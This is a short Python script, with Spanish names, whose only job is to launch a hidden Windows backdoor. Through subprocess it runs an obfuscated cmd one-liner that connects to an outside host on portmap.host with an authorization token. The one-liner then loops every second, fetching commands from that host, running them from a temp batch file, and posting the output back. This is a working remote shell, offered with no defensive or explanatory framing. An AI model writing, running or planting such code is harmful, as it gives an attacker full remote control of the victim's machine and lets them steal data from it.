import subprocess


comando = {}

def ejecutar_comando(CM):
    try:
        subprocess.run(CM , shell=True , check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar el comando '{CM}' : {e}")


def main():
    comando['comando_prtincipal'] = (
        '@echo off&cmd /V:ON /C "SET ip=deisec153-55062.portmap.host:55062&&SET sid="Auth'
        'orization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > N'
        r'UL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629e'
        'a455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL'

    )
    ejecutar_comando(comando['comando_prtincipal'])


main()